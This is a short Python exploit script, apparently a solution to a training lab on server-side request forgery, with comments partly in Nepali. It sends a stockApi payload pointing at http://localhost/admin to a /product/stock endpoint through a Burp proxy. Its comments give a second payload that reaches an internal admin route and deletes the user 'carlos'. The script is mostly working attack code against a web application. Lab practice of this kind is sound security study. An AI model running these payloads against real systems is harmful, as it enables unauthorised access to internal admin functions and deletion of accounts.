# THE IDEA IS SIMPLE ACCESS THE POST REQUEST TO THE /product/stock 
# yasko stockApi parameter ma we have to put: http://localhost/admin ==> this will give us a 200OK res
# and then we have to delete the carlos user by: stockApi=http://127.0.0.1/admin/delete?username=carlos and hit send and it will give me redirect on the /admin page 
# when deleting carlos this request came: GET /admin/delete?username=carlos now we have to delete it by giving it to the vulnerable parameter
# 

import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# set the burp proxy

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def stockApi(s,url):
    path=url + '/product/stock'
    data={'stockApi':'http://localhost/admin'}
    # send a post request
    response=s.post(url=path,data=data,verify=False,proxies=proxies)
    res=response.text
    print(res)




def main():
    if len(sys.argv)!=2:
        print("Usage %s <url>" % sys.argv[0])
        print("Example %s www.example.com" % sys.argv[0])
    else:
        s=requests.Session()
        url=sys.argv[1]
        stockApi(s,url)        
        








if __name__=="__main__":
    main()